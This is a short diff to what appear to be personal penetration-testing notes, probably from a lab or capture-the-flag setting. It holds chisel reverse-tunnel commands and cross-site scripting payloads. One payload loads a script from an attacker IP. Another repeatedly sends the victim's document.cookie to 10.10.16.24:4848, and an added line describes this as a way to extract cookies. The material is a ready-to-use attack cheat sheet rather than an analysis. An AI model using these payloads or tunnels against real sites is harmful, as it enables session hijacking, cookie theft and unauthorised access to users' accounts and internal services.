@@ -100,8 +100,7 @@ how to add attacker ot proxychains is what i need to look into
 .\chisel.exe client 10.10.16.24:9095 R:80localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
 ./chisel server -p 9095 -reverse
 
-### cross site scripting
-
+### cross site scripting / XSS
 
 <img src="10.10.16.24:8000/test.jpg" /> <script src="http://10.10.16.24:8000/cookie.js"></script>
 
@@ -118,3 +117,5 @@ for shell
 jsh.py -g
 
 <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.16.24:4848/?".concat(document.cookie)},1010)</script>
+
+this will get a shell to extract cookies.
